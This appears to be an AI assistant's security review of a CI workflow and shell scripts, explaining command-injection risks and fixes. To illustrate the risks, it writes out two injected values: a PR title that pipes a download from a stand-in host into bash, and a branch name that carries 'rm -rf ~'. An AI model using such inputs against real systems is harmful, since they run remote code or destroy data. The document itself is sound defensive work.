I couldn't find the script you described, so I haven't reviewed it. Searching the whole workspace for `ssh` (any case) returns nothing, and nothing mentions a branch name. Can you paste it or tell me its path? It may be on a branch that isn't checked out, or in another repo.

I did find two related scripts that already have problems worth fixing before CI.

**`.github/workflows/deploy.yml`: same bug class as the one you're worried about**
- **Line 14 lets anyone who opens a PR run shell commands.** `run: echo "Title is ${{ github.event.pull_request.title }}"` pastes the PR title into the script text before bash parses it. A title like `"; curl evil.sh | bash; "` runs on the CI runner. Fix: pass the value in through `env: { PR_TITLE: ${{ github.event.pull_request.title }} }` and use `"${PR_TITLE}"` in the script.
- **Line 7 makes that much worse.** `permissions: write-all` gives that injected code a token with write access to the repo. Grant only what the job needs, for example `contents: read`.

**`scripts/backup.sh`**
- **No strict mode.** If `tar` fails, the script carries on and copies an empty or partial archive.
- **Predictable temp directory and no cleanup trap.** `/tmp/backup.$$` is easy to guess and can be pre-created or symlinked by someone else. `rm -rf $TMP` only runs on the success path. Use `mktemp -d` with a cleanup on `EXIT` that is set up before the directory is created.
- **Expansions aren't quoted, and it uses backticks.** That's harmless with today's fixed values, but it breaks as soon as a path comes from input.

**What to check in the deploy script once I can see it**
1. **Don't build a command string and run it.** `ssh host "deploy $BRANCH"` is unsafe because the remote shell parses the whole string again, so `main; rm -rf ~` or `$(…)` in a branch name runs on the server. Quoting on the local side doesn't help, because ssh joins its arguments back into one string.
2. **Check the branch name against an allowlist and reject anything else.** Don't try to clean it up instead:
   ```bash
   if [[ ! ${branch} =~ ^[A-Za-z0-9._/-]+$ || ${branch} == -* || ${branch} == *..* ]]; then
     printf 'invalid branch: %s\n' "${branch}" >&2; exit 2
   fi
   ```
3. **Send the branch name as data, not as part of the command.** Either quote it with `printf %q` when building the remote command, or, better, run a fixed remote command and pass the branch on stdin:
   ```bash
   printf '%s\n' "${branch}" | ssh -- "${host}" '/opt/deploy/bin/deploy-branch'
   ```
   The remote script then reads it with `IFS= read -r branch` and checks it again. Even better, a `command=` restriction in `authorized_keys` pins the deploy key to that one script.
4. **In CI, the branch name comes from whoever opened the PR.** It must reach the shell through `env:`, never through `${{ … }}` inside `run:`, for the same reason as line 14 above.

Once you send the script, I'll go through it properly and run `shellcheck` and `bash -n` on it.
